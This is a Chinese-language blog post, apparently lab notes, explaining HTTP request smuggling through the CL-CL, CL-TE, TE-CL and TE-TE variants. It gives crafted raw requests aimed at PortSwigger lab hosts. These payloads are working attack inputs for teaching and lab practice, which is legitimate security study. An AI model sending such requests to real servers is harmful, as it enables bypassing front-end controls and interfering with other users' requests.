<!DOCTYPE html>
<html lang="zh-CN">
  <head>
    

<script>!function(){var e=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,t=localStorage.getItem("use-color-scheme")||"auto";("dark"===t||e&&"light"!==t)&&document.documentElement.classList.toggle("dark",!0)}()</script>

<meta charset="utf-8" >

<title>HTTP请求走私</title>
<meta name="keywords" content="HTTP请求走私, R0seW1thH3r">
<meta name="description" content="HTTP请求走私 - FreeBuf网络安全行业门户
由Roarctf Easy Calc引起对http走私和分块传输绕过waf的思考
请求走私漏洞成因

前端服务器(CDN)和后端服务器接收数据不同步，引起对客户端传入的数据理解不一致，从">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<link rel="shortcut icon" href="/archives/favicon.ico">
<link rel="stylesheet" href="/archives/style/main.css">


<link rel="stylesheet" href="/archives/style/jquery.fancybox.min.css">




    <link rel="stylesheet" href="/archives/style/prism.css"/>




  <meta name="generator" content="Hexo 6.1.0"></head>
  <body>
    <div id="app" class="main">

<div class="site-header-container">
  <div class="site-header">
    <div class="left">
      <a href="https://R0seW1thH3r.github.io/archives">
        <img class="avatar" src="/archives/images/avatar.png" alt="logo" width="32px" height="32px">
      </a>
      <a href="https://R0seW1thH3r.github.io/archives">
        <h1 class="site-title">R0seW1thH3r</h1>
      </a>
    </div>
    <div class="right">
        <i class="icon menu-switch icon-menu-outline" ></i>
    </div>
  </div>
</div>

<div class="menu-container" style="height: 0;opacity: 0;">
<nav class="menu-list">
  
    
      <a href="/archives/archives" class="menu purple-link">
        Index
      </a>
    
  
    
      <a href="/archives/tags" class="menu purple-link">
        Tags
      </a>
    
  
    
      <a href="/archives/about" class="menu purple-link">
        About
      </a>
    
  
</nav>
</div>



  <div class="content-container">
    <div class="post-detail">
      
      <h2 class="post-title">HTTP请求走私</h2>
      <div class="post-info post-detail-info">
        <span><i class="icon icon-calendar-outline"></i> 2022-12-12</span>
        
          <span>
          <i class="icon icon-pricetags-outline"></i>
            
              <a href="/archives/tags/web%E5%AE%89%E5%85%A8/">
              web安全
                
              </a>
            
          </span>
        
      </div>
      <div class="post-content-wrapper">
        <div class="post-content">
          <p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/243652.html">HTTP请求走私 - FreeBuf网络安全行业门户</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/fsMLNHiyd1_tQkz9wTRhMg">由Roarctf Easy Calc引起对http走私和分块传输绕过waf的思考</a></p>
<p><strong>请求走私漏洞成因</strong></p>
<blockquote>
<p>前端服务器(CDN)和后端服务器接收数据不同步，引起对客户端传入的数据理解不一致，从而导致漏洞的产生。</p>
</blockquote>
<p>攻击者使前端请求的一部分请求被后端服务器解释为下一个请求的开始。它实际上是在下一个请求之前，因此会干扰应用程序处理该请求的方式。这是请求走私攻击，可能会造成破坏性后果。</p>
<p>大多数HTTP请求走私漏洞的出现是因为HTTP规范提供了两种不同的方法来指定请求的结束位置：<code>Content-Length</code>标头和<code>Transfer-Encoding</code>标头。</p>
<p>走私的类型：</p>
<h3 id="CL不为0的GET请求"><a href="#CL不为0的GET请求" class="headerlink" title="CL不为0的GET请求"></a>CL不为0的GET请求</h3><p>只有GET请求。前端允许POST，后端不允许POST，也就是说前端会读取<code>Content-Length</code>的值，而后端则会忽略掉<code>Content-Length</code>。</p>
<pre class="line-numbers language-none"><code class="language-none">GET &#x2F; HTTP&#x2F;1.1\r\n
Host: example.com\r\n
Content-Length: 44\r\n

GET &#x2F; secret HTTP&#x2F;1.1\r\n
Host: example.com\r\n
\r\n<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>前端服务器收到该请求，通过读取<code>Content-Length</code>，判断这是一个完整的请求。</p>
<p>而后端服务器收到后，因为它不对<code>Content-Length</code>进行处理，就会认为这是收到了两个请求。</p>
<h3 id="CL-CL"><a href="#CL-CL" class="headerlink" title="CL-CL"></a>CL-CL</h3><p>前端代理服务器按照第一个<code>Content-Length</code>的值对请求进行处理。</p>
<p>后端服务器按照第二个<code>Content-Length</code>的值进行处理。</p>
<pre class="line-numbers language-none"><code class="language-none">POST &#x2F; HTTP&#x2F;1.1\r\n
Host: example.com\r\n
Content-Length: 8\r\n
Content-Length: 7\r\n

12345\r\n
a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h3><p>前端代理服务器处理<code>Content-Length</code>这一请求头。</p>
<p>后端服务器处理<code>Transfer-Encoding</code>这一请求头。</p>
<p>chunk传输数据格式如下，其中size的值由16进制表示。</p>
<pre class="line-numbers language-none"><code class="language-none">[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size &#x3D; 0][\r\n][\r\n]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Lab 地址：<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te</a></p>
<p>构造数据包</p>
<pre class="line-numbers language-none"><code class="language-none">POST &#x2F; HTTP&#x2F;1.1\r\n
Host: ace01fcf1fd05faf80c21f8b00ea006b.web-security-academy.net\r\n
Content-Length: 6\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
G<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h3><p>前端代理服务器处理<code>Transfer-Encoding</code>这一请求头。</p>
<p>后端服务器处理<code>Content-Length</code>请求头。</p>
<p>Lab地址：<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl">https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</a></p>
<p>构造数据包</p>
<pre class="line-numbers language-none"><code class="language-none">POST &#x2F; HTTP&#x2F;1.1\r\n
Host: acf41f441edb9dc9806dca7b00000035.web-security-academy.net\r\n
User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko&#x2F;20100101 Firefox&#x2F;56.0\r\n
Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8\r\n
Accept-Language: en-US,en;q&#x3D;0.5\r\n
Cookie: session&#x3D;3Eyiu83ZSygjzgAfyGPn8VdGbKw5ifew\r\n
Content-Length: 4\r\n
Transfer-Encoding: chunked\r\n
\r\n
12\r\n
GPOST &#x2F; HTTP&#x2F;1.1\r\n
\r\n
0\r\n
\r\n<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE-TE"></a>TE-TE</h3><p>前后端服务器都处理<code>Transfer-Encoding</code>请求头。</p>
<p>这确实是实现了RFC的标准。不过前后端服务器毕竟不是同一种，这就有了一种方法，我们可以对发送的请求包中的<code>Transfer-Encoding</code>进行某种混淆操作，从而使其中一个服务器不处理<code>Transfer-Encoding</code>请求头。从某种意义上还是<code>CL-TE</code>或者<code>TE-CL</code>。</p>
<p>Lab地址：<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header">https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header</a></p>
<p>构造数据包</p>
<pre class="line-numbers language-none"><code class="language-none">POST &#x2F; HTTP&#x2F;1.1\r\n
Host: ac4b1fcb1f596028803b11a2007400e4.web-security-academy.net\r\n
User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko&#x2F;20100101 Firefox&#x2F;56.0\r\n
Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8\r\n
Accept-Language: en-US,en;q&#x3D;0.5\r\n
Cookie: session&#x3D;Mew4QW7BRxkhk0p1Thny2GiXiZwZdMd8\r\n
Content-length: 4\r\n
Transfer-Encoding: chunked\r\n
Transfer-encoding: cow\r\n
\r\n
5c\r\n
GPOST &#x2F; HTTP&#x2F;1.1\r\n
Content-Type: application&#x2F;x-www-form-urlencoded\r\n
Content-Length: 15\r\n
\r\n
x&#x3D;1\r\n
0\r\n
\r\n<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

        </div>
        <div class="top-div">
          <ol class="top-box"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#CL%E4%B8%8D%E4%B8%BA0%E7%9A%84GET%E8%AF%B7%E6%B1%82"><span class="top-box-text">CL不为0的GET请求</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#CL-CL"><span class="top-box-text">CL-CL</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#CL-TE"><span class="top-box-text">CL-TE</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#TE-CL"><span class="top-box-text">TE-CL</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#TE-TE"><span class="top-box-text">TE-TE</span></a></li></ol>
        </div>
      </div>
    </div>

    
      <div class="next-post">
        <a class="purple-link" href="/archives/2022/09/20/thinkphp5.0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
          <h3 class="post-title">
            下一篇：thinkphp5.0反序列化
          </h3>
        </a>
      </div>
    
  </div>




<footer>
<div class="site-footer">
  <div class="social-container">
    
      
        <a href="https://github.com/" target="_blank">
          <i class="icon icon-github"></i>
        </a>
      
    
      
        <a href="https://twitter.com/" target="_blank">
          <i class="icon icon-twitter"></i>
        </a>
      
    
      
    
      
    
      
    
  </div>
  
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> <a href="https://github.com/f-dong/hexo-theme-minimalism" target="_blank">Theme</a>
  
  
  
  
  
  
</div>
</footer>


      </div>
      
    <script src="/archives/js/jquery.min.js"></script>
    <script src="/archives/js/jquery.fancybox.min.js"></script>


<script id="hexo-configurations">
    window.theme_config = {"image":{"lazyload_enable":false}};
    window.is_post = true;
  </script>

<script src="/archives/js/main.js"></script>





    </div>
  </body>
</html>

